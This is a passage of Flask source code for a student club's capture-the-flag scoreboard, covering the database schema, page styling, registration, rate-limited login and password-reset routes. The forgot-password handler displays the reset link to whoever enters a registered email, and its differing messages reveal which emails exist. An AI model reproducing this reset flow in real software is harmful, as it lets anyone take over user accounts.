                points INTEGER NOT NULL,
                ts TEXT NOT NULL,
                UNIQUE(user_id, challenge)
            )""")
        cur.execute("""
            CREATE TABLE IF NOT EXISTS password_resets (
                id SERIAL PRIMARY KEY,
                user_id INTEGER NOT NULL,
                token TEXT UNIQUE NOT NULL,
                created TEXT NOT NULL,
                used INTEGER DEFAULT 0
            )""")
        conn.commit()
        conn.close()
    else:
        c = sqlite3.connect(DB)
        c.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT UNIQUE NOT NULL,
                display_name TEXT NOT NULL,
                pw_hash TEXT NOT NULL,
                created TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS solves (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                challenge TEXT NOT NULL,
                points INTEGER NOT NULL,
                ts TEXT NOT NULL,
                UNIQUE(user_id, challenge)
            );
            CREATE TABLE IF NOT EXISTS password_resets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                token TEXT UNIQUE NOT NULL,
                created TEXT NOT NULL,
                used INTEGER DEFAULT 0
            );
        """)
        c.commit()
        c.close()

init_db()


def current_user():
    uid = session.get("uid")
    return qexec("SELECT * FROM users WHERE id=?", (uid,), fetchone=True) if uid else None


def login_required(fn):
    @wraps(fn)
    def wrap(*a, **kw):
        if not session.get("uid"):
            return redirect(url_for("login"))
        return fn(*a, **kw)
    return wrap


def has_logo():
    return os.path.exists(os.path.join(HERE, "logo.png"))


def my_solves():
    if not session.get("uid"):
        return set()
    rows = qexec("SELECT challenge FROM solves WHERE user_id=?", (session["uid"],), fetchall=True)
    return {r["challenge"] for r in rows}


def my_score():
    if not session.get("uid"):
        return 0
    return qexec("SELECT COALESCE(SUM(points),0) AS s FROM solves WHERE user_id=?",
                  (session["uid"],), fetchone=True)["s"]


@app.route("/logo.png")
def logo():
    p = os.path.join(HERE, "logo.png")
    return send_file(p) if os.path.exists(p) else abort(404)


# ---------------------------------------------------------------------------
BASE = r"""
<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{ title or 'CCSIT CTF' }}</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@500;600;700&display=swap" rel="stylesheet">
<style>
:root {
  --bg: #060b09;
  --bg2: #0c1410;
  --surface: rgba(12,22,17,.78);
  --surface-h: rgba(18,34,25,.9);
  --surface-solid: #101c15;
  --border: rgba(34,197,94,.18);
  --border-h: rgba(34,197,94,.4);
  --text: #e8f0ec;
  --text2: #7d9a8b;
  --green: #22c55e;
  --green2: #16a34a;
  --green3: #15803d;
  --green-glow: rgba(34,197,94,.12);
  --green-glow2: rgba(34,197,94,.06);
  --gold: #eab308;
  --gold2: #ca8a04;
  --red: #ef4444;
  --purple: #a855f7;
  --card-r: 16px;
  --font: 'Inter', system-ui, -apple-system, sans-serif;
  --mono: 'JetBrains Mono', 'Fira Code', monospace;
}
*{box-sizing:border-box;margin:0;padding:0}
html{scroll-behavior:smooth}
body{background:var(--bg);color:var(--text);font:15px/1.6 var(--font);min-height:100vh;overflow-x:hidden}
a{color:inherit;text-decoration:none}
h1,h2,h3{font-weight:800;letter-spacing:-.02em}

/* ===== animated particle canvas ===== */
#particles{position:fixed;inset:0;z-index:0;pointer-events:none}

/* ===== masthead ===== */
.mast{
  position:sticky;top:0;z-index:100;
  background:rgba(6,11,9,.8);
  backdrop-filter:blur(24px) saturate(1.6);
  -webkit-backdrop-filter:blur(24px) saturate(1.6);
  border-bottom:1px solid var(--border);
}
.mast .in{max-width:1100px;margin:0 auto;display:flex;align-items:center;gap:14px;padding:12px 24px}
.mast .brand{display:flex;align-items:center;gap:12px}
.mast img{width:36px;height:36px;border-radius:10px;object-fit:cover;border:1px solid var(--border)}
.mast .wm{display:flex;flex-direction:column;line-height:1.15}
.mast .en{font-weight:800;font-size:15px;color:var(--green);letter-spacing:.3px}
.mast .ar{font-size:10px;color:var(--text2)}
.mast .sp{flex:1}
.mast nav{display:flex;align-items:center;gap:4px}
.mast nav a{padding:8px 16px;border-radius:10px;font-weight:600;font-size:14px;color:var(--text2);transition:all .2s}
.mast nav a:hover{color:var(--text);background:rgba(34,197,94,.1)}
.mast nav a.active{color:#fff;background:var(--green3);box-shadow:0 0 12px rgba(34,197,94,.2)}
.chip{display:inline-flex;gap:6px;align-items:center;padding:6px 14px;border-radius:10px;border:1px solid var(--border);font-weight:600;font-size:13px;color:var(--text2);background:var(--surface)}
.chip b{font-family:var(--mono);color:var(--green);font-size:14px}

/* hamburger */
.hamburger{display:none;background:none;border:none;color:var(--text);cursor:pointer;padding:8px}
.hamburger svg{width:24px;height:24px}
.mob-nav{display:none;position:fixed;inset:0;z-index:99;background:rgba(6,11,9,.95);backdrop-filter:blur(20px);
  flex-direction:column;align-items:center;justify-content:center;gap:8px}
.mob-nav.open{display:flex}
.mob-nav a{font-size:20px;font-weight:700;padding:16px 40px;border-radius:12px;color:var(--text2);transition:all .2s;width:80%;text-align:center}
.mob-nav a:hover,.mob-nav a.active{color:#fff;background:var(--green3)}
.mob-close{position:absolute;top:16px;right:20px;background:none;border:none;color:var(--text);font-size:28px;cursor:pointer}

.wrap{max-width:1100px;margin:0 auto;padding:32px 24px 60px;position:relative;z-index:1}

/* ===== scroll reveal ===== */
.reveal{opacity:0;transform:translateY(24px);transition:opacity .5s ease,transform .5s ease}
.reveal.visible{opacity:1;transform:translateY(0)}

/* ===== cards ===== */
.card{
  background:var(--surface);backdrop-filter:blur(12px);
  border:1px solid var(--border);border-radius:var(--card-r);
  padding:28px;margin-bottom:20px;
  transition:border-color .25s,box-shadow .25s,transform .25s;
}
.card:hover{border-color:var(--border-h);box-shadow:0 4px 30px rgba(34,197,94,.06)}

/* ===== section heading ===== */
.sect{display:flex;align-items:center;gap:12px;margin:0 0 20px}
.sect::before{content:'';width:4px;height:22px;background:linear-gradient(180deg,var(--green),var(--green2));border-radius:2px}
.sect h2{font-size:20px;color:var(--text)}

/* ===== hero ===== */
.hero{text-align:center;padding:48px 0 20px;position:relative}
.hero img{border-radius:16px;border:2px solid var(--border);box-shadow:0 0 40px rgba(34,197,94,.1)}
.hero h1{
  font-size:40px;margin:20px 0 6px;font-weight:900;
  background:linear-gradient(135deg,#86efac,var(--green),var(--green2));
  background-size:200% auto;
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
  background-clip:text;
  animation:shimmerText 4s linear infinite;
}
@keyframes shimmerText{0%{background-position:0% center}100%{background-position:200% center}}
.hero .line{width:60px;height:3px;margin:14px auto;background:linear-gradient(90deg,var(--green),var(--gold));border-radius:2px}
.hero .sub{color:var(--green);font-weight:700;font-size:15px}
.hero .uni{color:var(--text2);font-size:13px;margin-top:4px}
.hero .terminal{
  display:inline-block;margin-top:16px;padding:10px 20px;
  background:var(--surface-solid);border:1px solid var(--border);border-radius:10px;
  font-family:var(--mono);font-size:13px;color:var(--green);
}
.hero .terminal .cursor{animation:blink 1s step-end infinite}
@keyframes blink{50%{opacity:0}}

/* ===== forms ===== */
label{color:var(--text2);font-size:13px;font-weight:600;display:block;margin-bottom:6px}
input,select{
  width:100%;padding:12px 14px;margin-bottom:16px;
  background:rgba(6,11,9,.7);border:1px solid var(--border);
  border-radius:10px;color:var(--text);font:15px var(--font);
  transition:border-color .2s,box-shadow .2s;outline:none;
}
input:focus{border-color:var(--green);box-shadow:0 0 0 3px var(--green-glow),0 0 20px rgba(34,197,94,.08)}
input::placeholder{color:var(--text2);opacity:.4}
.btn{
  display:inline-flex;align-items:center;justify-content:center;gap:8px;
  background:linear-gradient(135deg,var(--green3),var(--green2),var(--green));
  background-size:200% auto;
  color:#fff;border:0;padding:13px 28px;border-radius:10px;
  cursor:pointer;font-weight:700;font-size:15px;font-family:var(--font);
  transition:all .25s;position:relative;overflow:hidden;
}
.btn:hover{background-position:right center;transform:translateY(-2px);box-shadow:0 8px 25px rgba(34,197,94,.3)}
.btn:active{transform:translateY(0)}
.btn::after{
  content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;
  background:linear-gradient(transparent,rgba(255,255,255,.05),transparent);
  transform:rotate(45deg);transition:all .5s;
}
.btn:hover::after{left:100%}
.btn.ghost{background:transparent;border:1px solid var(--border);color:var(--text2);background-size:auto}
.btn.ghost:hover{border-color:var(--green);color:var(--green);background:var(--green-glow);transform:translateY(-1px);box-shadow:none}
.btn.ghost::after{display:none}
.btn.sm{padding:8px 16px;font-size:13px;border-radius:8px}

.muted{color:var(--text2)}.mono{font-family:var(--mono)}
.err{color:var(--red);font-weight:600;font-size:14px;margin-bottom:12px;padding:10px 14px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);border-radius:8px}
.link{color:var(--green);font-weight:600}.link:hover{text-decoration:underline}

/* ===== welcome bar ===== */
.welcome{
  display:flex;align-items:center;gap:24px;
  background:linear-gradient(135deg,var(--surface),rgba(34,197,94,.05));
  border:1px solid var(--border);border-radius:var(--card-r);
  padding:24px 28px;margin-bottom:24px;flex-wrap:wrap;
  position:relative;overflow:hidden;
}
.welcome::before{
  content:'';position:absolute;top:0;right:0;width:200px;height:200px;
  background:radial-gradient(circle,rgba(34,197,94,.08),transparent 70%);
  pointer-events:none;
}
.wname{font-weight:900;font-size:24px;background:linear-gradient(135deg,var(--text),var(--green));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.prog{flex:1;min-width:200px}
.prow{display:flex;justify-content:space-between;font-size:12px;color:var(--text2);margin-bottom:8px}
.bar{height:6px;background:rgba(34,197,94,.1);border-radius:3px;overflow:hidden}
.bar span{display:block;height:100%;border-radius:3px;background:linear-gradient(90deg,var(--green2),var(--green));transition:width 1.2s cubic-bezier(.4,0,.2,1)}
.rank{display:flex;flex-direction:column;align-items:flex-end;font-size:12px;line-height:1.3}
.rank b{font-size:26px;font-family:var(--mono);color:var(--green)}

/* ===== stats ===== */
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:28px}
.stats .s{
  background:var(--surface);border:1px solid var(--border);
  border-radius:14px;padding:20px;text-align:center;
  transition:all .25s;position:relative;overflow:hidden;
}
.stats .s:hover{border-color:var(--border-h);transform:translateY(-2px);box-shadow:0 8px 24px rgba(34,197,94,.08)}
.stats .s::after{
  content:'';position:absolute;inset:0;
  background:radial-gradient(circle at 50% 0%,rgba(34,197,94,.06),transparent 60%);
  pointer-events:none;opacity:0;transition:opacity .3s;
}
.stats .s:hover::after{opacity:1}
.stats .ico{font-size:24px;margin-bottom:10px;display:block}
.stats .n{font-family:var(--mono);font-weight:800;font-size:30px;color:var(--green);line-height:1}
.stats .l{color:var(--text2);font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-top:6px}

/* ===== challenge list ===== */
.clist{display:flex;flex-direction:column;gap:12px}
.crow{
  display:flex;align-items:center;gap:20px;
  background:var(--surface);border:1px solid var(--border);
  border-radius:14px;padding:20px 24px;
  transition:all .25s;cursor:pointer;position:relative;overflow:hidden;
}
.crow::before{content:'';position:absolute;left:0;top:0;bottom:0;width:4px;background:linear-gradient(180deg,var(--green),var(--green2));border-radius:0 2px 2px 0;transition:width .2s}
.crow::after{
  content:'';position:absolute;inset:0;
  background:linear-gradient(90deg,rgba(34,197,94,.03),transparent 40%);
  opacity:0;transition:opacity .3s;pointer-events:none;
}
.crow:hover{border-color:var(--green);transform:translateX(4px);box-shadow:0 4px 24px rgba(34,197,94,.1)}
.crow:hover::before{width:6px}
.crow:hover::after{opacity:1}
.crow .main{flex:1;min-width:0}
.crow .cat{font-family:var(--mono);font-size:11px;color:var(--green);letter-spacing:1.5px;text-transform:uppercase;font-weight:600}
.crow h3{margin:4px 0;font-size:18px}
.crow .d{color:var(--text2);font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:50ch}
.crow .meta{text-align:right;white-space:nowrap}
.crow .pts{font-family:var(--mono);font-weight:700;color:var(--green);font-size:18px}
.diff{display:inline-block;font-size:11px;font-weight:700;padding:3px 12px;border-radius:6px;margin-bottom:6px}
.diff-Easy{background:rgba(34,197,94,.12);color:var(--green)}
.diff-Medium{background:rgba(234,179,8,.12);color:var(--gold)}
.diff-Hard{background:rgba(239,68,68,.12);color:var(--red)}
.diff-Insane{background:rgba(168,85,247,.12);color:var(--purple)}
.solved-badge{
  display:inline-flex;align-items:center;gap:4px;
  font-size:12px;font-weight:700;color:var(--green);
  background:rgba(34,197,94,.1);padding:3px 10px;border-radius:6px;
  margin-left:8px;
}
.tag{display:inline-block;padding:4px 12px;border:1px solid var(--border);border-radius:8px;font-size:12px;font-weight:600;color:var(--text2)}

/* ===== challenge detail ===== */
.urlbox{
  margin:20px 0;padding:20px;border:1px solid var(--border);border-radius:14px;
  background:linear-gradient(135deg,rgba(34,197,94,.04),rgba(34,197,94,.01));
  position:relative;overflow:hidden;
}
.urlbox::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--green),transparent);opacity:.3}
.urlbox .l{color:var(--text2);font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px}
.copy-btn{
  background:var(--surface-solid);border:1px solid var(--border);color:var(--text2);
  padding:6px 12px;border-radius:8px;cursor:pointer;font-size:12px;font-family:var(--font);
  font-weight:600;transition:all .2s;
}
.copy-btn:hover{border-color:var(--green);color:var(--green)}
.copy-btn.copied{color:var(--green);border-color:var(--green)}

#sout{margin-top:14px;min-height:20px;font-family:var(--mono);font-size:14px;padding:14px;border-radius:10px;display:none;word-break:break-all;border:1px solid}
.win{background:rgba(34,197,94,.1);color:var(--green);border-color:rgba(34,197,94,.25)!important;display:block!important}
.bad{background:rgba(239,68,68,.1);color:var(--red);border-color:rgba(239,68,68,.25)!important;display:block!important}
.steps{list-style:none;counter-reset:s;margin:20px 0}
.steps li{display:flex;gap:16px;padding:16px 0;border-top:1px solid var(--border)}
.steps li:first-child{border-top:0}
.steps li::before{counter-increment:s;content:counter(s,decimal-leading-zero);font-family:var(--mono);font-weight:700;color:var(--green);min-width:30px;font-size:16px}
.steps b{display:block;font-size:14px;margin-bottom:2px}
.steps span{color:var(--text2);font-size:13px}

/* ===== leaderboard ===== */
.lb-podium{display:flex;align-items:flex-end;justify-content:center;gap:12px;margin-bottom:28px;padding:20px 0}
.podium-card{
  display:flex;flex-direction:column;align-items:center;gap:8px;
  padding:20px 16px;border-radius:14px;min-width:120px;
  background:var(--surface);border:1px solid var(--border);
  transition:all .3s;
}
.podium-card:hover{transform:translateY(-4px);box-shadow:0 8px 30px rgba(34,197,94,.1)}
.podium-card.first{order:2;padding:28px 20px;border-color:rgba(234,179,8,.3);background:linear-gradient(180deg,rgba(234,179,8,.08),var(--surface))}
.podium-card.second{order:1}
.podium-card.third{order:3}
.podium-medal{font-size:32px;line-height:1}
.podium-name{font-weight:700;font-size:14px;max-width:110px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;text-align:center}
.podium-score{font-family:var(--mono);font-weight:700;color:var(--green);font-size:18px}
.podium-label{font-size:10px;color:var(--text2);text-transform:uppercase;letter-spacing:1px}

table{width:100%;border-collapse:collapse;font-size:14px}
th,td{text-align:left;padding:14px 16px;border-bottom:1px solid var(--border)}
th{color:var(--text2);font-size:11px;text-transform:uppercase;letter-spacing:1px;font-weight:600}
tbody tr{transition:all .2s}
tbody tr:hover{background:rgba(34,197,94,.04)}
tr.me td{background:rgba(34,197,94,.06)}
.rkn{font-family:var(--mono);font-weight:700;color:var(--text2)}
tr.gold .rkn{color:var(--gold)}
tr.silver .rkn{color:#94a3b8}
tr.bronze .rkn{color:#cd7f32}
.medal{font-size:18px;margin-right:4px}
.time-ago{font-size:12px;color:var(--text2)}

/* ===== password strength ===== */
.pw-meter{margin:-10px 0 16px}
.pw-bar{height:4px;border-radius:2px;background:rgba(255,255,255,.06);overflow:hidden;margin-bottom:6px}
.pw-bar span{display:block;height:100%;border-radius:2px;transition:width .3s,background .3s}
.pw-label{font-size:11px;font-weight:600}
.pw-rules{font-size:12px;color:var(--text2);margin:-8px 0 14px;line-height:1.8}
.pw-rules .ok{color:var(--green)}.pw-rules .no{color:var(--red);opacity:.5}

/* ===== confetti canvas ===== */
#confetti{position:fixed;inset:0;z-index:200;pointer-events:none}

/* ===== footer ===== */
footer{text-align:center;color:var(--text2);font-size:12px;padding:24px 0;border-top:1px solid var(--border);margin-top:40px;position:relative;z-index:1}
footer a{color:var(--green);font-weight:600}

/* ===== responsive ===== */
@media(max-width:768px){
  .stats{grid-template-columns:repeat(2,1fr)}
  .crow{flex-wrap:wrap}
  .mast nav{display:none}
  .hamburger{display:block}
  .hero h1{font-size:30px}
  .welcome{gap:16px}
  .lb-podium{gap:8px}
  .podium-card{min-width:90px;padding:16px 10px}
  .podium-card.first{padding:20px 14px}
}
@media(max-width:480px){
  .mast .in{padding:10px 16px;gap:10px}
  .wrap{padding:20px 16px 40px}
  .stats{gap:10px}
  .chip{display:none}
  .lb-podium{flex-wrap:wrap}
}
</style></head><body>
<canvas id="particles"></canvas>
<div class="mast"><div class="in">
  <a class="brand" href="{{ url_for('index') if user else url_for('login') }}">
    {% if has_logo %}<img src="{{ url_for('logo') }}" alt="">{% endif %}
    <span class="wm"><span class="en">CCSIT CTF</span><span class="ar">{{ club_ar }}</span></span>
  </a>
  <span class="sp"></span>
  <nav>
    {% if user %}
      <a href="{{ url_for('index') }}" class="{{ 'active' if nav=='home' }}">Challenges</a>
      <a href="{{ url_for('leaderboard') }}" class="{{ 'active' if nav=='lb' }}">Leaderboard</a>
      <span class="chip">⚑ <b>{{ score }}</b></span>
      <a href="{{ url_for('logout') }}">Logout</a>
    {% else %}
      <a href="{{ url_for('leaderboard') }}" class="{{ 'active' if nav=='lb' }}">Leaderboard</a>
      <a href="{{ url_for('login') }}" class="{{ 'active' if nav=='login' }}">Login</a>
      <a href="{{ url_for('register') }}" class="{{ 'active' if nav=='reg' }}">Register</a>
    {% endif %}
  </nav>
  <button class="hamburger" onclick="document.getElementById('mobnav').classList.add('open')">
    <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16"/></svg>
  </button>
</div></div>
<div class="mob-nav" id="mobnav">
  <button class="mob-close" onclick="this.parentElement.classList.remove('open')">&times;</button>
  {% if user %}
    <a href="{{ url_for('index') }}" class="{{ 'active' if nav=='home' }}">Challenges</a>
    <a href="{{ url_for('leaderboard') }}" class="{{ 'active' if nav=='lb' }}">Leaderboard</a>
    <a href="{{ url_for('logout') }}">Logout</a>
  {% else %}
    <a href="{{ url_for('leaderboard') }}" class="{{ 'active' if nav=='lb' }}">Leaderboard</a>
    <a href="{{ url_for('login') }}" class="{{ 'active' if nav=='login' }}">Login</a>
    <a href="{{ url_for('register') }}" class="{{ 'active' if nav=='reg' }}">Register</a>
  {% endif %}
</div>
<div class="wrap">{{ body|safe }}</div>
<footer>{{ uni_ar }}<br><span style="opacity:.5;font-size:11px">CCSIT Cybersecurity Club</span></footer>

<!-- particle background -->
<script>
(function(){
  var c=document.getElementById('particles'),x=c.getContext('2d');
  function resize(){c.width=window.innerWidth;c.height=window.innerHeight}
  resize();window.addEventListener('resize',resize);
  var dots=[];
  for(var i=0;i<40;i++) dots.push({x:Math.random()*c.width,y:Math.random()*c.height,
    vx:(Math.random()-.5)*.3,vy:(Math.random()-.5)*.3,r:Math.random()*1.5+.5});
  function draw(){
    x.clearRect(0,0,c.width,c.height);
    for(var i=0;i<dots.length;i++){
      var d=dots[i];
      d.x+=d.vx;d.y+=d.vy;
      if(d.x<0||d.x>c.width)d.vx*=-1;
      if(d.y<0||d.y>c.height)d.vy*=-1;
      x.beginPath();x.arc(d.x,d.y,d.r,0,Math.PI*2);
      x.fillStyle='rgba(34,197,94,.25)';x.fill();
      for(var j=i+1;j<dots.length;j++){
        var e=dots[j],dx=d.x-e.x,dy=d.y-e.y,dist=Math.sqrt(dx*dx+dy*dy);
        if(dist<150){x.beginPath();x.moveTo(d.x,d.y);x.lineTo(e.x,e.y);
          x.strokeStyle='rgba(34,197,94,'+((.15)*(1-dist/150))+')';x.stroke()}
      }
    }
    requestAnimationFrame(draw);
  }
  draw();
})();
</script>

<!-- scroll reveal -->
<script>
document.addEventListener('DOMContentLoaded',function(){
  var els=document.querySelectorAll('.reveal');
  if(!els.length) return;
  var obs=new IntersectionObserver(function(entries){
    entries.forEach(function(e){if(e.isIntersecting){e.target.classList.add('visible');obs.unobserve(e.target)}});
  },{threshold:.1,rootMargin:'0px 0px -40px 0px'});
  els.forEach(function(el){obs.observe(el)});
});
</script>

<!-- animated counters -->
<script>
function animateCounters(){
  document.querySelectorAll('[data-count]').forEach(function(el){
    var target=el.getAttribute('data-count'),isRatio=target.indexOf('/')!==-1;
    if(isRatio){el.textContent=target;return}
    var n=parseInt(target)||0,cur=0,step=Math.max(1,Math.floor(n/30)),dur=600,start=null;
    function frame(ts){
      if(!start)start=ts;var p=Math.min((ts-start)/dur,1);
      el.textContent=Math.floor(p*n);
      if(p<1)requestAnimationFrame(frame);else el.textContent=n;
    }
    if(n>0)requestAnimationFrame(frame);else el.textContent='0';
  });
}
document.addEventListener('DOMContentLoaded',animateCounters);
</script>
</body></html>
"""


def render(body, **kw):
    ctx = dict(user=current_user(), has_logo=has_logo(),
               club_ar=CLUB_AR, uni_ar=UNI_AR, score=my_score(), nav="")
    ctx.update(kw)
    inner = render_template_string(body, **ctx)
    return render_template_string(BASE, body=inner, **ctx)


HERO = """
<div class="hero reveal">
  {% if has_logo %}<img src="{{ url_for('logo') }}" width="80" height="80">{% endif %}
  <h1>CCSIT CTF</h1>
  <div class="line"></div>
  <div class="sub">{{ club_ar }} — جامعة الملك فيصل</div>
  <div class="uni">Capture the Flag</div>
  <div class="terminal">$ ./hack_the_challenge<span class="cursor">_</span></div>
</div>
"""


# ---------------------------------------------------------------------------
@app.route("/register", methods=["GET", "POST"])
def register():
    err = ""
    if request.method == "POST":
        email = (request.form.get("email") or "").strip().lower()
        name = (request.form.get("display_name") or "").strip()
        p = request.form.get("password") or ""
        p2 = request.form.get("password2") or ""
        if not email or not p or not name:
            err = "All fields are required."
        elif not re.match(r'^[^@\s]+@[^@\s]+\.[^@\s]+$', email):
            err = "Enter a valid email address."
        elif len(name) > 32:
            err = "Display name too long (max 32 chars)."
        elif len(name) < 2:
            err = "Display name too short (min 2 chars)."
        elif not re.match(r'^[a-zA-Z0-9_.\- ]+$', name):
            err = "Display name: letters, numbers, spaces, _ . - only."
        elif p != p2:
            err = "Passwords don't match."
        else:
            pw_errs = check_password_policy(p)
            if pw_errs:
                err = "Password needs: " + ", ".join(pw_errs) + "."
            else:
                try:
                    qexec("INSERT INTO users (email,display_name,pw_hash,created) VALUES (?,?,?,?)",
                          (email, name, generate_password_hash(p),
                           datetime.datetime.now().isoformat(timespec="seconds")))
                    db().commit()
                    session.permanent = True
                    session["uid"] = qexec("SELECT id FROM users WHERE email=?", (email,), fetchone=True)["id"]
                    return redirect(url_for("index"))
                except Exception as e:
                    try:
                        db().rollback()
                    except Exception:
                        pass
                    estr = str(e).lower()
                    if "unique" in estr or "duplicate" in estr or "integrity" in estr:
                        err = "Email already registered."
                    else:
                        err = "Registration error. Please try again."
                        app.logger.error("Register error: %s", e)
    return render(HERO + r"""
        <div class="card reveal" style="max-width:460px;margin:0 auto">
          <div class="sect"><h2>Create Account</h2></div>
          {% if err %}<p class="err">{{ err }}</p>{% endif %}
          <form method="post">
            <label>Email</label>
            <input name="email" type="email" autocomplete="email" placeholder="you@example.com" required>
            <label>Display Name</label>
            <input name="display_name" autocomplete="off" placeholder="How others see you" maxlength="32" required>
            <label>Password</label>
            <input name="password" type="password" id="pw1" autocomplete="new-password" placeholder="Min 8 chars, mixed case + digit" required>
            <div class="pw-meter">
              <div class="pw-bar"><span id="pwbar"></span></div>
              <span class="pw-label" id="pwlabel"></span>
            </div>
            <div class="pw-rules" id="pwrules">
              <div id="r_len" class="no">✗ 8+ characters</div>
              <div id="r_up" class="no">✗ Uppercase letter</div>
              <div id="r_lo" class="no">✗ Lowercase letter</div>
              <div id="r_dig" class="no">✗ Digit</div>
            </div>
            <label>Confirm Password</label>
            <input name="password2" type="password" id="pw2" autocomplete="new-password" placeholder="Re-enter password" required>
            <div id="pw_match" style="font-size:12px;margin:-10px 0 14px"></div>
            <button class="btn" style="width:100%">Create Account</button>
          </form>
          <p class="muted" style="margin-top:16px;margin-bottom:0;text-align:center">
            Already have an account? <a class="link" href="{{ url_for('login') }}">Login</a>
          </p>
        </div>
        <script>
        (function(){
          var pw=document.getElementById('pw1'),bar=document.getElementById('pwbar'),
              lbl=document.getElementById('pwlabel'),pw2=document.getElementById('pw2'),
              mtch=document.getElementById('pw_match');
          var rules={len:document.getElementById('r_len'),up:document.getElementById('r_up'),
                     lo:document.getElementById('r_lo'),dig:document.getElementById('r_dig')};
          function check(v){
            var s=0,c={len:v.length>=8,up:/[A-Z]/.test(v),lo:/[a-z]/.test(v),dig:/[0-9]/.test(v)};
            for(var k in c){
              var txt=rules[k].textContent.slice(2);
              if(c[k]){s++;rules[k].className='ok';rules[k].textContent='✓ '+txt}
              else{rules[k].className='no';rules[k].textContent='✗ '+txt}
            }
            if(v.length>=12&&s>=4)s=5;
            var pct=[0,20,40,60,80,100][s],
                colors=['var(--red)','var(--red)','#f97316','var(--gold)','var(--green)','var(--green)'],
                labels=['','Weak','Fair','Good','Strong','Very Strong'];
            bar.style.width=pct+'%';bar.style.background=colors[s];
            lbl.textContent=labels[s];lbl.style.color=colors[s];
          }
          pw.addEventListener('input',function(){check(this.value)});
          function matchCheck(){
            if(!pw2.value){mtch.textContent='';return}
            if(pw.value===pw2.value){mtch.style.color='var(--green)';mtch.textContent='✓ Passwords match'}
            else{mtch.style.color='var(--red)';mtch.textContent='✗ Passwords don\'t match'}
          }
          pw2.addEventListener('input',matchCheck);
          pw.addEventListener('input',matchCheck);
        })();
        </script>
        """, err=err, title="Register — CCSIT CTF", nav="reg")


@app.route("/login", methods=["GET", "POST"])
def login():
    err = ""
    if request.method == "POST":
        ip = request.remote_addr
        if is_rate_limited(ip):
            remaining = int(LOGIN_WINDOW - (time.time() - min(_login_attempts[ip])))
            err = f"Too many attempts. Try again in {remaining // 60 + 1} min."
        else:
            email = (request.form.get("email") or "").strip().lower()
            p = request.form.get("password") or ""
            row = qexec("SELECT * FROM users WHERE email=?", (email,), fetchone=True)
            if row and check_password_hash(row["pw_hash"], p):
                _login_attempts.pop(ip, None)
                session.permanent = True
                session["uid"] = row["id"]
                return redirect(url_for("index"))
            record_login_attempt(ip)
            remaining = MAX_LOGIN_ATTEMPTS - len(_login_attempts[ip])
            err = f"Invalid credentials. {remaining} attempt{'s' if remaining!=1 else ''} left." if remaining > 0 else "Too many attempts. Try again later."
    return render(HERO + """
        <div class="card reveal" style="max-width:460px;margin:0 auto">
          <div class="sect"><h2>Welcome Back</h2></div>
          {% if err %}<p class="err">{{ err }}</p>{% endif %}
          <form method="post">
            <label>Email</label>
            <input name="email" type="email" autocomplete="email" placeholder="you@example.com" required>
            <label>Password</label>
            <input name="password" type="password" autocomplete="current-password" placeholder="Your password" required>
            <button class="btn" style="width:100%">Login</button>
          </form>
          <p class="muted" style="margin-top:12px;margin-bottom:0;text-align:center">
            <a class="link" href="{{ url_for('forgot_password') }}">Forgot password?</a>
          </p>
          <p class="muted" style="margin-top:8px;margin-bottom:0;text-align:center">
            New here? <a class="link" href="{{ url_for('register') }}">Create account</a>
          </p>
        </div>""", err=err, title="Login — CCSIT CTF", nav="login")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.route("/forgot-password", methods=["GET", "POST"])
def forgot_password():
    msg = ""
    err = ""
    if request.method == "POST":
        email = (request.form.get("email") or "").strip().lower()
        if not email:
            err = "Enter your email address."
        else:
            row = qexec("SELECT id FROM users WHERE email=?", (email,), fetchone=True)
            if row:
                token = secrets.token_urlsafe(32)
                qexec("INSERT INTO password_resets (user_id,token,created) VALUES (?,?,?)",
                      (row["id"], token, datetime.datetime.now().isoformat(timespec="seconds")))
                db().commit()
                reset_url = request.host_url.rstrip("/") + url_for("reset_password", token=token)
                msg = f'Reset link: <a class="link" href="{reset_url}" style="word-break:break-all">{reset_url}</a>'
            else:
                msg = "If an account with that email exists, a reset link has been generated."
    return render(HERO + """
        <div class="card reveal" style="max-width:460px;margin:0 auto">
          <div class="sect"><h2>Forgot Password</h2></div>
          <p class="muted" style="margin-top:0">Enter your email and we'll generate a reset link.</p>
          {% if err %}<p class="err">{{ err }}</p>{% endif %}
          {% if msg %}<div class="ok-msg" style="background:rgba(34,197,94,.1);border:1px solid var(--green);border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:14px;color:var(--green)">{{ msg|safe }}</div>{% endif %}
          <form method="post">
            <label>Email</label>
            <input name="email" type="email" autocomplete="email" placeholder="you@example.com" required>
            <button class="btn" style="width:100%">Get Reset Link</button>
          </form>
          <p class="muted" style="margin-top:16px;margin-bottom:0;text-align:center">
            <a class="link" href="{{ url_for('login') }}">Back to Login</a>
          </p>
        </div>""", err=err, msg=msg, title="Forgot Password — CCSIT CTF", nav="")


@app.route("/reset-password/<token>", methods=["GET", "POST"])
def reset_password(token):
    reset = qexec("""
        SELECT pr.id, pr.user_id, pr.token, pr.created, pr.used, u.email
        FROM password_resets pr JOIN users u ON u.id=pr.user_id
        WHERE pr.token=? AND pr.used=0""", (token,), fetchone=True)
    if not reset:
        return render(HERO + """
            <div class="card reveal" style="max-width:460px;margin:0 auto">
